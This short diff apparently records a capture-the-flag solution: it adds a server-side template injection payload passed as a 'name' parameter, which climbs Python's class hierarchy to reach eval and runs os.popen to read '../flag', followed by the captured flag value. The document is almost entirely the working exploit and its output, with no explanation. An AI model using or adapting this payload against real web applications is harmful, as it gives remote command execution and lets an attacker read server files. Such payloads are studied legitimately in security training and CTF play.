@@ -1,0 +1,3 @@
+name={{''.__class__.__mro__[1].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat ../flag").read()')}}
+
+flag{7fe0e79b-04c3-0e7e-cee4-72559a53cdeb}
